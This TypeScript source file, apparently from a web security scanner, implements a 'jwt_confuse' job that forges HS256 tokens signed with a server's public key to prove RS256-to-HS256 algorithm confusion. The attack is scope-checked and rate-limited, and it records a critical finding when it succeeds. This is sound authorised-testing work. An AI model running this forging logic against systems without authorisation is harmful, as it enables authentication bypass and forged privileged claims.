import { randomBytes } from 'node:crypto'
import { getDomain } from '../../domains/store'
import { addScoredFinding } from '../../findings/score'
import {
  algIsAsymmetric,
  confusionConfirmed,
  decodeJwt,
  forgeAlgConfusion,
  jwkToPem,
  keyMaterialCandidates,
  type ConfusionResponse,
} from '../../owasp/jwt'
import { sendRawRequest, type ReplayRequest } from '../../replay/send'
import { guardedFetch } from '../../sources/guard'
import { grabTlsCert } from '../../sources/tlsCert'
import { safeJsonParse } from '../../util/json'
import { hostBelongsToDomain, isValidDomain, isValidHostname } from '../../util/validate'
import type { JobContext } from '../worker'

// jwt_confuse: PROVE an RS256->HS256 algorithm confusion. The operator marks the
// token slot with {{JWT}} and supplies the original (asymmetrically-signed) token;
// we obtain the server's PUBLIC key (jwks / TLS cert / operator PEM), HMAC-sign a
// forged HS256 token WITH that public key, and send baseline / control / forged.
// A server that doesn't pin the alg accepts the forged token — self-verifying,
// so a hit is a critical A07 finding. LOUD + gated; all egress via the guarded
// senders (sendRawRequest / guardedFetch); honors ctx.signal.

const JWT_MARKER = '{{JWT}}'
const MAX_FORGE_SENDS = 12

function applyJwt(template: ReplayRequest, token: string): ReplayRequest {
  const sub = (s: string | undefined) => (s == null ? s : s.split(JWT_MARKER).join(token))
  const headers = template.headers
    ? Object.fromEntries(Object.entries(template.headers).map(([k, v]) => [k, sub(v) ?? v]))
    : undefined
  return { ...template, url: sub(template.url) ?? template.url, headers, body: sub(template.body) }
}

// Candidate public keys, in priority order: jwks (RSA keys, kid-matched first),
// then the leaf TLS certificate. All fetches SSRF-guarded; empty on any failure.
async function collectPublicKeyPems(
  scheme: string,
  host: string,
  kid: string | undefined,
  signal: AbortSignal,
): Promise<{ pem: string; source: string }[]> {
  const out: { pem: string; source: string }[] = []
  for (const path of ['/.well-known/jwks.json', '/jwks.json']) {
    if (signal.aborted) break
    const res = await guardedFetch(`${scheme}://${host}${path}`, { signal, maxBytes: 256 * 1024 })
    if (!res || res.status >= 400) continue
    const parsed = safeJsonParse<{ keys?: Record<string, unknown>[] }>(res.body, {})
    const keys = Array.isArray(parsed.keys) ? parsed.keys : []
    // Prefer the JWK whose kid matches the token header.
    const ordered = kid ? [...keys].sort((a, b) => Number(b.kid === kid) - Number(a.kid === kid)) : keys
    for (const k of ordered) {
      const pem = jwkToPem(k)
      if (pem) out.push({ pem, source: `jwks ${path}${typeof k.kid === 'string' ? ` kid=${k.kid}` : ''}` })
    }
    if (out.length) break
  }
  if (!signal.aborted) {
    try {
      const cert = await grabTlsCert(host)
      if (cert?.publicKeyPem) out.push({ pem: cert.publicKeyPem, source: 'TLS certificate' })
    } catch {
      /* best-effort — a missing cert key just means one fewer source */
    }
  }
  return out
}

export async function jwtConfuseHandler({ params, log, progress, signal }: JobContext) {
  const domainId = Number(params.domainId)
  const domain = getDomain(domainId)
  if (!domain) throw new Error(`domain ${domainId} not found`)

  const template = params.template as ReplayRequest | undefined
  if (!template || typeof template.url !== 'string') throw new Error('jwt_confuse: missing request template')
  const host = new URL(template.url).hostname
  if (!isValidHostname(host) && !isValidDomain(host)) throw new Error(`invalid host: ${host}`)
  if (host !== domain.host && !hostBelongsToDomain(host, domain.host)) {
    throw new Error(`host ${host} does not belong to ${domain.host}`)
  }
  const scheme = new URL(template.url).protocol === 'http:' ? 'http' : 'https'

  const token = typeof params.token === 'string' ? params.token.trim() : ''
  const decoded = token ? decodeJwt(token) : null
  if (!decoded) throw new Error('jwt_confuse: a decodable original JWT is required')
  const alg = String(decoded.header.alg ?? '').toUpperCase()
  const fp = token.slice(-6)

  // Only asymmetric-alg tokens are confusable — an HS* token is already symmetric.
  if (!algIsAsymmetric(alg)) {
    log.info({ host, alg }, 'jwt_confuse: token alg is not asymmetric — nothing to confuse')
    return { host, confirmed: 0, reason: `token alg ${alg || '(none)'} is not asymmetric` }
  }

  progress('collecting candidate public keys')
  const keys: { pem: string; source: string }[] = []
  const operatorPem = typeof params.publicKeyPem === 'string' && params.publicKeyPem.includes('BEGIN') ? params.publicKeyPem : ''
  if (operatorPem) keys.push({ pem: operatorPem, source: 'operator-supplied' })
  const kid = typeof decoded.header.kid === 'string' ? decoded.header.kid : undefined
  for (const k of await collectPublicKeyPems(scheme, host, kid, signal)) keys.push(k)

  if (!keys.length || signal.aborted) {
    log.info({ host, aborted: signal.aborted }, 'jwt_confuse: no public key to test')
    return { host, confirmed: 0, reason: signal.aborted ? 'aborted' : 'no public key (jwks / TLS cert) found' }
  }

  const send = async (tok: string): Promise<ConfusionResponse> => {
    try {
      const res = await sendRawRequest(applyJwt(template, tok), { signal })
      return { status: res.status, body: res.body }
    } catch {
      return { status: 0, body: '' }
    }
  }

  // Baseline (the valid token) and control (HS256 signed with a random WRONG
  // secret) once — the control is the false-positive killer.
  progress('baseline + control requests')
  const baseline = await send(token)
  const controlToken = forgeAlgConfusion(token, randomBytes(32).toString('hex'))
  const control = controlToken ? await send(controlToken) : { status: 0, body: '' }

  // Forge with each public-key representation until one is accepted like the
  // baseline (identical claims → the body should match if the signature is trusted).
  let hit: { source: string; forged: ConfusionResponse } | null = null
  let sends = 0
  outer: for (const key of keys) {
    for (const [i, material] of keyMaterialCandidates(key.pem).entries()) {
      if (signal.aborted || sends >= MAX_FORGE_SENDS) break outer
      const forgedToken = forgeAlgConfusion(token, material)
      if (!forgedToken) continue
      sends++
      progress(`forging with ${key.source} (variant ${i + 1})`)
      const forged = await send(forgedToken)
      if (confusionConfirmed(baseline, control, forged)) {
        hit = { source: key.source, forged }
        break outer
      }
    }
  }

  if (signal.aborted && !hit) {
    log.warn({ host }, 'jwt_confuse aborted before confirming')
    return { host, aborted: true, confirmed: 0 }
  }

  if (hit) {
    await addScoredFinding({
      domainId,
      type: 'owasp',
      data: {
        target: host,
        category: 'A07',
        name: 'JWT algorithm confusion confirmed (RS256->HS256)',
        severity: 'critical',
        url: `${template.url} [${fp}]`,
        evidence: `A token HMAC-signed (HS256) with the server's PUBLIC key (${hit.source}) was accepted like the valid ${alg} token (status ${hit.forged.status}), while a wrong-key control token was rejected (status ${control.status}). The server does not pin the signing algorithm — any claims (role/admin) can be forged.`,
      },
      tags: ['owasp', 'jwt', 'confirmed', 'alg-confusion', 'owasp:A07', 'sev:critical'],
    })
    log.info({ host, source: hit.source }, 'jwt_confuse CONFIRMED')
    return { host, confirmed: 1, source: hit.source, keysTried: keys.length }
  }

  log.info({ host, keys: keys.length, sends }, 'jwt_confuse: not confirmed (alg likely pinned)')
  return { host, confirmed: 0, reason: 'not confirmed (alg likely pinned)', keysTried: keys.length }
}
